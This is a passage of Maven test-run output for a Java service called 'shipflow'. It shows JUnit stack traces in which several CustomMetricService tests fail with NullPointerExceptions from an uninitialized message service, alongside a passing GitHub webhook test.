	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:53.416Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.github.GitHubWebhookService    : Error processing webhook event

java.lang.RuntimeException: Parse error
	at com.fasterxml.jackson.databind.ObjectMapper.readTree(ObjectMapper.java:3217) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.github.farzadsedaghatbin.shipflow.service.github.GitHubWebhookService.processWebhook(GitHubWebhookService.java:70) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.github.GitHubWebhookServiceTest.processWebhook_WithError_ShouldSaveErrorMessage(GitHubWebhookServiceTest.java:121) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.071 s -- in com.github.farzadsedaghatbin.shipflow.service.github.GitHubWebhookServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CalculateMetricTests
2026-01-17T23:26:53.586Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Calculating value for metric 1 (user: 1)
2026-01-17T23:26:53.587Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Calculating value for metric 1 (user: 999)
2026-01-17T23:26:53.589Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Calculating value for metric 999 (user: 1)
[ERROR] Tests run: 3, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 0.172 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CalculateMetricTests
[ERROR] com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CalculateMetricTests.shouldThrowExceptionWhenNotAuthorizedToCalculate -- Time elapsed: 0.002 s <<< FAILURE!
org.opentest4j.AssertionFailedError: Unexpected exception type thrown, expected: <java.lang.SecurityException> but was: <java.lang.NullPointerException>
	at org.junit.jupiter.api.AssertionFailureBuilder.build(AssertionFailureBuilder.java:151)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:67)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:35)
	at org.junit.jupiter.api.Assertions.assertThrows(Assertions.java:3115)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CalculateMetricTests.shouldThrowExceptionWhenNotAuthorizedToCalculate(CustomMetricServiceTest.java:414)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
Caused by: java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.calculateMetricValue(CustomMetricService.java:217)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CalculateMetricTests.lambda$2(CustomMetricServiceTest.java:415)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:53)
	... 7 more

[ERROR] com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CalculateMetricTests.shouldThrowExceptionWhenCalculatingNonExistentMetric -- Time elapsed: 0.001 s <<< FAILURE!
org.opentest4j.AssertionFailedError: Unexpected exception type thrown, expected: <java.lang.IllegalArgumentException> but was: <java.lang.NullPointerException>
	at org.junit.jupiter.api.AssertionFailureBuilder.build(AssertionFailureBuilder.java:151)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:67)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:35)
	at org.junit.jupiter.api.Assertions.assertThrows(Assertions.java:3115)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CalculateMetricTests.shouldThrowExceptionWhenCalculatingNonExistentMetric(CustomMetricServiceTest.java:403)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
Caused by: java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.lambda$8(CustomMetricService.java:214)
	at java.base/java.util.Optional.orElseThrow(Optional.java:403)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.calculateMetricValue(CustomMetricService.java:214)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CalculateMetricTests.lambda$1(CustomMetricServiceTest.java:404)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:53)
	... 7 more

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CreateMetricTests
2026-01-17T23:26:53.590Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'New Metric' for user 1
2026-01-17T23:26:53.591Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Created custom metric with ID: 2
2026-01-17T23:26:53.591Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Metric' for user 999
2026-01-17T23:26:53.592Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Duplicate Metric' for user 1
2026-01-17T23:26:53.593Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Invalid Metric' for user 1
[ERROR] Tests run: 4, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 0.004 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CreateMetricTests
[ERROR] com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CreateMetricTests.shouldThrowExceptionForDuplicateName -- Time elapsed: 0 s <<< FAILURE!
org.opentest4j.AssertionFailedError: Unexpected exception type thrown, expected: <java.lang.IllegalArgumentException> but was: <java.lang.NullPointerException>
	at org.junit.jupiter.api.AssertionFailureBuilder.build(AssertionFailureBuilder.java:151)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:67)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:35)
	at org.junit.jupiter.api.Assertions.assertThrows(Assertions.java:3115)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CreateMetricTests.shouldThrowExceptionForDuplicateName(CustomMetricServiceTest.java:173)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
Caused by: java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.createMetric(CustomMetricService.java:55)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CreateMetricTests.lambda$2(CustomMetricServiceTest.java:174)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:53)
	... 7 more

[ERROR] com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CreateMetricTests.shouldThrowExceptionForInvalidFormula -- Time elapsed: 0 s <<< FAILURE!
org.opentest4j.AssertionFailedError: Unexpected exception type thrown, expected: <java.lang.IllegalArgumentException> but was: <java.lang.NullPointerException>
	at org.junit.jupiter.api.AssertionFailureBuilder.build(AssertionFailureBuilder.java:151)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:67)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:35)
	at org.junit.jupiter.api.Assertions.assertThrows(Assertions.java:3115)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CreateMetricTests.shouldThrowExceptionForInvalidFormula(CustomMetricServiceTest.java:152)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
Caused by: java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.createMetric(CustomMetricService.java:50)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$CreateMetricTests.lambda$1(CustomMetricServiceTest.java:153)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:53)
	... 7 more

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$DeleteMetricTests
2026-01-17T23:26:53.594Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Deleting custom metric 999 for user 1
2026-01-17T23:26:53.595Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Deleting custom metric 1 for user 1
2026-01-17T23:26:53.595Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Deleted custom metric: 1
2026-01-17T23:26:53.596Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Deleting custom metric 1 for user 999
[ERROR] Tests run: 3, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 0.002 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$DeleteMetricTests
[ERROR] com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$DeleteMetricTests.shouldThrowExceptionWhenDeletingNonExistentMetric -- Time elapsed: 0.001 s <<< FAILURE!
org.opentest4j.AssertionFailedError: Unexpected exception type thrown, expected: <java.lang.IllegalArgumentException> but was: <java.lang.NullPointerException>
	at org.junit.jupiter.api.AssertionFailureBuilder.build(AssertionFailureBuilder.java:151)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:67)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:35)
	at org.junit.jupiter.api.Assertions.assertThrows(Assertions.java:3115)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$DeleteMetricTests.shouldThrowExceptionWhenDeletingNonExistentMetric(CustomMetricServiceTest.java:285)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
Caused by: java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.lambda$5(CustomMetricService.java:172)
	at java.base/java.util.Optional.orElseThrow(Optional.java:403)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.deleteMetric(CustomMetricService.java:172)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$DeleteMetricTests.lambda$0(CustomMetricServiceTest.java:286)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:53)
	... 7 more

[ERROR] com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$DeleteMetricTests.shouldThrowExceptionWhenNotAuthorizedToDelete -- Time elapsed: 0.001 s <<< FAILURE!
org.opentest4j.AssertionFailedError: Unexpected exception type thrown, expected: <java.lang.SecurityException> but was: <java.lang.NullPointerException>
	at org.junit.jupiter.api.AssertionFailureBuilder.build(AssertionFailureBuilder.java:151)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:67)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:35)
	at org.junit.jupiter.api.Assertions.assertThrows(Assertions.java:3115)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$DeleteMetricTests.shouldThrowExceptionWhenNotAuthorizedToDelete(CustomMetricServiceTest.java:296)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
Caused by: java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.deleteMetric(CustomMetricService.java:176)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$DeleteMetricTests.lambda$1(CustomMetricServiceTest.java:297)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:53)
	... 7 more

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$FormulaValidationTests
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s -- in com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$FormulaValidationTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$GetMetricTests
[ERROR] Tests run: 4, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 0.002 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$GetMetricTests
[ERROR] com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$GetMetricTests.shouldThrowExceptionWhenNotAuthorizedToView -- Time elapsed: 0.001 s <<< FAILURE!
org.opentest4j.AssertionFailedError: Unexpected exception type thrown, expected: <java.lang.SecurityException> but was: <java.lang.NullPointerException>
	at org.junit.jupiter.api.AssertionFailureBuilder.build(AssertionFailureBuilder.java:151)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:67)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:35)
	at org.junit.jupiter.api.Assertions.assertThrows(Assertions.java:3115)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$GetMetricTests.shouldThrowExceptionWhenNotAuthorizedToView(CustomMetricServiceTest.java:366)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
Caused by: java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.getMetric(CustomMetricService.java:200)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$GetMetricTests.lambda$1(CustomMetricServiceTest.java:367)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:53)
	... 7 more

[ERROR] com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$GetMetricTests.shouldThrowExceptionWhenGettingNonExistentMetric -- Time elapsed: 0.001 s <<< FAILURE!
org.opentest4j.AssertionFailedError: Unexpected exception type thrown, expected: <java.lang.IllegalArgumentException> but was: <java.lang.NullPointerException>
	at org.junit.jupiter.api.AssertionFailureBuilder.build(AssertionFailureBuilder.java:151)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:67)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:35)
	at org.junit.jupiter.api.Assertions.assertThrows(Assertions.java:3115)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$GetMetricTests.shouldThrowExceptionWhenGettingNonExistentMetric(CustomMetricServiceTest.java:355)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
Caused by: java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.lambda$7(CustomMetricService.java:197)
	at java.base/java.util.Optional.orElseThrow(Optional.java:403)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.getMetric(CustomMetricService.java:197)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$GetMetricTests.lambda$0(CustomMetricServiceTest.java:356)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:53)
	... 7 more

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$MetricHistoryTests
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s -- in com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$MetricHistoryTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$ScopeFeatureTests
2026-01-17T23:26:53.603Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Team Metric' for user 1
